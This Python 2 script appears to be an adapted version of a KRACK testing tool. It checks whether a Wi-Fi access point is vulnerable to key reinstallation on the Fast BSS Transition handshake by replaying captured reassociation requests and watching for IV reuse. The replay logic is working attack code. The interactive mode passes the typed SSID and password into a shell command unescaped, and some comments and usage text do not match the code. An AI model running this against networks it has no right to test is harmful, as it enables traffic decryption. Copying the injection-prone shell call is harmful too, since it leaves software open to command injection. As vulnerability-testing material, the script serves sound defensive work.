#!/usr/bin/env python2

# Copyright (c) 2017, Mathy Vanhoef <Mathy.Vanhoef@cs.kuleuven.be>
#
# This code may be distributed under the terms of the BSD license.
# See README for more details.

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import sys
import socket
import struct
import time
import subprocess
import atexit
import select
from datetime import datetime

IEEE_TLV_TYPE_RSN = 48
IEEE_TLV_TYPE_FT = 55

IEEE80211_RADIOTAP_RATE = (1 << 2)
IEEE80211_RADIOTAP_CHANNEL = (1 << 3)
IEEE80211_RADIOTAP_TX_FLAGS = (1 << 15)
IEEE80211_RADIOTAP_DATA_RETRIES = (1 << 17)

USAGE = """KRAck.py: {arg}
Usage:
    python krack.py -i|--interactives
                    -e|--example
                    -h|--help"""

EXAMPLE = """{name} - Tool to test Key Reinstallation Attacks against an AP

To test wheter an AP is vulnerable to a Key Reinstallation Attack against
the Fast BSS Transition (FT) handshake, {name} executes the following steps:

1. Create a wpa_supplicant configuration file that can be used to connect
   to the network. A basic example is:

      ctrl_interface=/var/run/wpa_supplicant
      network={{
          ssid="testnet"
          key_mgmt=FT-PSK
          psk="password"
      }}

   Note the use of "FT-PSK". Save it as network.conf or similar. For more
   info see https://w1.fi/cgit/hostap/plain/wpa_supplicant/wpa_supplicant.conf

2. Try to connect to the network using your platform's wpa_supplicant.
   This will likely require a command such as:

      sudo wpa_supplicant -D nl80211 -i wlan0 -c network.conf

   If this fails, either the AP does not support FT, or you provided the wrong
   network configuration options in step 1.

3. Use this script as a wrapper over the previous wpa_supplicant command:

      sudo {name} wpa_supplicant -D nl80211 -i wlan0 -c network.conf

   This will execute the wpa_supplicant command using the provided parameters,
   and will add a virtual monitor interface that will perform attack tests.

4. Use wpa_cli to roam to a different AP of the same network. For example:

      sudo wpa_cli
      > status
      bssid=c4:e9:84:db:fb:7b
      ssid=testnet
      ...
      > scan_results
      bssid / frequency / signal level / flags / ssid
      c4:e9:84:db:fb:7b	2412  -21  [WPA2-PSK+FT/PSK-CCMP][ESS] testnet
      c4:e9:84:1d:a5:bc	2412  -31  [WPA2-PSK+FT/PSK-CCMP][ESS] testnet
      ...
      > roam c4:e9:84:1d:a5:bc
      ...

   In this example we were connected to AP c4:e9:84:db:fb:7b of testnet (see
   status command). The scan_results command shows this network also has a
   second AP with MAC c4:e9:84:1d:a5:bc. We then roam to this second AP.

5. Generate traffic between the AP and client. For example:

      sudo arping -I wlan0 192.168.1.10

6. Now look at the output of {name} to see if the AP is vulnerable.

   6a. First it should say "Detected FT reassociation frame". Then it will
       start replaying this frame to try the attack.
   6b. The script shows which IVs the AP is using when sending data frames.
   6c. Message "IV reuse detected (IV=X, seq=Y). AP is vulnerable!" means
       we confirmed it's vulnerable.

   Example output of vulnerable AP:
      [15:59:24] Replaying Reassociation Request
      [15:59:25] AP transmitted data using IV=1 (seq=0)
      [15:59:25] Replaying Reassociation Request
      [15:59:26] AP transmitted data using IV=1 (seq=0)
      [15:59:26] IV reuse detected (IV=1, seq=0). AP is vulnerable!

   Example output of patched AP (note that IVs are never reused):
      [16:00:49] Replaying Reassociation Request
      [16:00:49] AP transmitted data using IV=1 (seq=0)
      [16:00:50] AP transmitted data using IV=2 (seq=1)
      [16:00:50] Replaying Reassociation Request
      [16:00:51] AP transmitted data using IV=3 (seq=2)
      [16:00:51] Replaying Reassociation Request
      [16:00:52] AP transmitted data using IV=4 (seq=3)
"""

#### Basic output and logging functionality ####

ALL, DEBUG, INFO, STATUS, WARNING, ERROR = range(6)
COLORCODES = {"gray": "\033[0;37m",
              "green": "\033[0;32m",
              "orange": "\033[0;33m",
              "red": "\033[0;31m"}

global_log_level = INFO


def log(level, msg, color=None, showtime=True):
    if level < global_log_level:
        return
    if level == DEBUG and color is None:
        color = "gray"
    if level == WARNING and color is None:
        color = "orange"
    if level == ERROR and color is None:
        color = "red"
    print (datetime.now().strftime(
        '[%H:%M:%S] ') if showtime else " " * 11) + COLORCODES.get(color, "") + msg + "\033[1;0m"


#### Packet Processing Functions ####

class MitmSocket(L2Socket):
    def __init__(self, **kwargs):
        super(MitmSocket, self).__init__(**kwargs)

    def send(self, p):
        # Hack: set the More Data flag so we can detect injected frames
        p[Dot11].FCfield |= 0x20
        L2Socket.send(self, RadioTap() / p)

    def _strip_fcs(self, p):
        # Scapy can't handle FCS field automatically
        if p[RadioTap].present & 2 != 0:
            rawframe = str(p[RadioTap])
            pos = 8
            while ord(rawframe[pos - 1]) & 0x80 != 0:
                pos += 4

            # If the TSFT field is present, it must be 8-bytes aligned
            if p[RadioTap].present & 1 != 0:
                pos += (8 - (pos % 8))
                pos += 8

            # Remove FCS if present
            if ord(rawframe[pos]) & 0x10 != 0:
                return Dot11(str(p[Dot11])[:-4])

        return p[Dot11]

    def recv(self, x=MTU):
        p = L2Socket.recv(self, x)
        if p == None or not Dot11 in p:
            return None

        # Hack: ignore frames that we just injected and are echoed back by the kernel
        if p[Dot11].FCfield & 0x20 != 0:
            return None

        # Strip the FCS if present, and drop the RadioTap header
        return self._strip_fcs(p)

    def close(self):
        super(MitmSocket, self).close()


def dot11_get_seqnum(p):
    return p[Dot11].SC >> 4


def dot11_get_iv(p):
    """Scapy can't handle Extended IVs, so do this properly ourselves"""
    if Dot11WEP not in p:
        log(ERROR, "INTERNAL ERROR: Requested IV of plaintext frame")
        return 0

    wep = p[Dot11WEP]
    if wep.keyid & 32:
        return ord(wep.iv[0]) + (ord(wep.iv[1]) << 8) + (struct.unpack(">I", wep.wepdata[:4])[0] << 16)
    else:
        return ord(wep.iv[0]) + (ord(wep.iv[1]) << 8) + (ord(wep.iv[2]) << 16)


def get_tlv_value(p, type):
    if not Dot11Elt in p:
        return None
    el = p[Dot11Elt]
    while isinstance(el, Dot11Elt):
        if el.ID == type:
            return el.info
        el = el.payload
    return None


#### Man-in-the-middle Code ####

class KRAckAttackFt():
    def __init__(self, interface):
        self.nic_iface = interface
        self.nic_mon = interface + "mon"
        self.clientmac = scapy.arch.get_if_hwaddr(interface)

        self.sock = None
        self.wpasupp = None
        self.reassoc = None
        self.ivs = set()
        self.next_replay = None

    def handle_rx(self):
        p = self.sock.recv()
        if p == None:
            return

        if p.addr2 == self.clientmac and Dot11ReassoReq in p:
            if get_tlv_value(p, IEEE_TLV_TYPE_RSN) and get_tlv_value(p, IEEE_TLV_TYPE_FT):
                log(INFO, "Detected FT reassociation frame")
                self.reassoc = p
                self.next_replay = time.time() + 1
            else:
                log(INFO, "Reassociation frame does not appear to be an FT one")
                self.reassoc = None
            self.ivs = set()

        elif p.addr2 == self.clientmac and Dot11AssoReq in p:
            log(INFO, "Detected normal association frame")
            self.reassoc = None
            self.ivs = set()

        elif p.addr1 == self.clientmac and Dot11WEP in p:
            iv = dot11_get_iv(p)
            log(INFO, "AP transmitted data using IV=%d (seq=%d)" %
                (iv, dot11_get_seqnum(p)))
            if iv in self.ivs:
                log(INFO, ("IV reuse detected (IV=%d, seq=%d). " +
                           "AP is vulnerable!.") % (iv, dot11_get_seqnum(p)), color="green")
            self.ivs.add(iv)

    def configure_interfaces(self):
        log(STATUS, "Note: disable Wi-Fi in your network manager so it doesn't interfere with this script")

        # 1. Remove unused virtual interfaces to start from clean state
        subprocess.call(["iw", self.nic_mon, "del"],
                        stdout=subprocess.PIPE, stdin=subprocess.PIPE)

        # 2. Configure monitor mode on interfaces
        subprocess.check_output(
            ["iw", self.nic_iface, "interface", "add", self.nic_mon, "type", "monitor"])
        # Some kernels (Debian jessie - 3.16.0-4-amd64) don't properly add the monitor interface. The following ugly
        # sequence of commands to assure the virtual interface is registered as a 802.11 monitor interface.
        subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
        time.sleep(0.5)
        subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
        subprocess.check_output(["ifconfig", self.nic_mon, "up"])

    def run(self):
        self.configure_interfaces()

        # Make sure to use a recent backports driver package so we can indeed
        # capture and inject packets in monitor mode.
        self.sock = MitmSocket(type=ETH_P_ALL, iface=self.nic_mon)

        # Set up a rouge AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
        self.wpasupp = subprocess.Popen(
            "wpa_supplicant -D nl80211 -i wlan0 -c network.conf", shell=True)

        # Continue attack by monitoring both channels and performing needed actions
        while True:
            sel = select.select([self.sock], [], [], 1)
            if self.sock in sel[0]:
                self.handle_rx()

            if self.reassoc and time.time() > self.next_replay:
                log(INFO, "Replaying Reassociation Request")
                self.sock.send(self.reassoc)
                self.next_replay = time.time() + 1

    def stop(self):
        log(STATUS, "Closing hostapd and cleaning up ...")
        if self.wpasupp:
            self.wpasupp.terminate()
            self.wpasupp.wait()
        if self.sock:
            self.sock.close()


def cleanup():
    attack.stop()


if __name__ == "__main__":
    if "--help" in sys.argv or "-h" in sys.argv:
        print USAGE.format(arg="")
        quit(1)
    elif "--example" in sys.argv or "-e" in sys.argv:
        print EXAMPLE.format(name=sys.argv[0])
        quit(1)
    elif "--interactive" in sys.argv or "-i" in sys.argv:
        conf = open('network.conf', 'w')
        ssid, passwd = None, None
        while not ssid:
            ssid = raw_input('Wifi SSID: ')
        while not passwd:
            passwd = raw_input('Wifi password: ')
        conf.write('ctrl_interface=/var/run/wpa_supplicant\n' + subprocess.check_output("wpa_passphrase %s %s" %
                                                                                        (ssid, passwd), shell=True))
        conf.close()
        attack = KRAckAttackFt("wlan0")
        atexit.register(cleanup)
        attack.run()
    else:
        if sys.argv[1:]:
            print USAGE.format(arg="Unknown Argument: " + str(sys.argv[1:]))
        else:
            print USAGE.format(arg="")
